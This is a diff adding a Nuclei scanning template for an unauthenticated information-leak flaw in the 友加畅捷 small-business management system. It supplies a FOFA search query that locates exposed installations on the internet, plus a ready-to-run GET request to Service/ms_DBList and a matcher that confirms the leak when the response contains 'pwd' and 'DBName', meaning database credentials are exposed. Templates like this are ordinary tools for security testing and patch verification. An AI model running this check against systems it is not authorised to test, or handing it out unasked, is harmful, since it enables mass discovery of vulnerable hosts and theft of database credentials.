@@ -1,0 +1,30 @@
+id: u-plus-ms_DBList-disclosure
+info:
+  name: 友加畅捷管理系统 Service/ms_DBLis 未授权访问致信息泄露漏洞
+  author: leadlife
+  severity: high
+  description: 友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理软件，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。该系统的 Service/ms_DBList 接口存在未授权访问漏洞，攻击者无需任何认证即可直接访问该接口，从而获取敏感信息。此漏洞可能导致企业内部数据泄露，包括但不限于用户列表、配置信息等，对企业的运营安全和数据隐私构成严重威胁。
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="2049187099" || body="http://www.youjiasoft.com/"
+    tips:
+    repair:
+    version:
+  tags: u-plus,disclosure
+
+http:
+  - raw:
+      - |
+        GET /Service/ms_DBList?a=789234 HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'pwd','DBName')
+        condition: and
